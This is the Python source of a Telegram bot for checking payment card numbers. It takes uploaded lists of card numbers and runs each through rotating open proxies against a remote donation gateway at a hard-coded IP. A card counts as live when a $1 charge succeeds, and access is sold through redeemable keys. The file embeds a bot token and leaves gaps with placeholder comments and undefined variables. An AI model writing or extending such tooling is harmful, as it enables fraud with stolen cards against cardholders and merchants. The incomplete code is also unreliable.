from telebot import TeleBot, types
import requests
import time
import random
import string
from datetime import datetime, timedelta
import sys

bot = TeleBot("7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU")

GATEWAY = "http://138.128.240.15:8025/paypal_donate?cc="

ADMIN_ID = 7077294261

allowed_users = {}
active_keys = {}
live_cards = []
stop_flags = {}

proxies_list = [
    "http://148.230.4.241:999",
    "http://2.78.60.10:3129",
    "http://1.231.81.166:3128",
    "http://45.167.124.71:999",
    "http://103.157.200.126:3128",
    "http://80.92.204.47:1081"
]

current_proxy = 0

def print_log(text):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {text}", file=sys.stdout, flush=True)

def generate_key():
    return "KEY-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def get_proxy():
    global current_proxy
    proxy = proxies_list[current_proxy % len(proxies_list)]
    current_proxy += 1
    print_log(f"AUTO PROXY → {proxy}")
    return {"http": proxy, "https": proxy}

@bot.message_handler(commands=['start'])
def start(m):
    user_id = m.from_user.id
    if user_id in allowed_users and allowed_users[user_id] > datetime.now():
        bot.send_message(m.chat.id, "✅ **Access Granted**")
        print_log(f"User {user_id} started bot - Access Granted")
    else:
        bot.send_message(m.chat.id, "🔐 **Access Declined**\n\nKey redeem karo: `/redeem <key>`")
        print_log(f"User {user_id} tried to start - Access Declined")

@bot.message_handler(commands=['redeem'])
def redeem_key(m):
    if len(m.text.split()) < 2:
        bot.reply_to(m, "Usage: `/redeem KEY-XXXXXXXX`")
        return
    key = m.text.split(maxsplit=1)[1].strip()
    if key in active_keys and active_keys[key] > datetime.now():
        allowed_users[m.from_user.id] = active_keys[key]
        bot.reply_to(m, f"✅ **Key Accepted!**\nExpiry: {active_keys[key].strftime('%Y-%m-%d')}")
        print_log(f"User {m.from_user.id} redeemed key successfully")
        del active_keys[key]
    else:
        bot.reply_to(m, "❌ **Invalid or Expired Key**")
        print_log(f"User {m.from_user.id} tried invalid key")

# Admin Panel (same as before)
# ... (paste your admin panel code here)

# Mass Check with txt (same as before with logs)
@bot.message_handler(content_types=['document'])
def handle_file(m):
    # ... file handling ...

    print_log(f"Mass check started with {len(cards)} cards by user {m.from_user.id}")

    for i, card in enumerate(cards):
        if stop_flags.get(m.chat.id):
            print_log("Mass check stopped by user")
            break

        proxy = get_proxy()
        print_log(f"Checking card {i+1}/{len(cards)}: {card}")

        try:
            url = GATEWAY + card.replace(" ", "")
            r = requests.get(url, proxies=proxy, timeout=20)
            resp = r.text

            print_log(f"Response for {card[:8]}****: {resp[:150]}...")

            if any(x in resp.lower() for x in ["charge", "charged", "approved", "success", "live"]):
                live += 1
                live_cards.append(card)
                bot.send_message(m.chat.id, f"✅ **1$ Charged - Card Approved**\n{card}")
                print_log(f"LIVE CARD: {card}")
            else:
                dead += 1
                print_log(f"Declined: {card}")

        except Exception as e:
            dead += 1
            print_log(f"Error on {card}: {e}")

        time.sleep(1.2)

    print_log(f"Mass check finished. Charged: {live} | Dead: {dead}")

bot.infinity_polling()
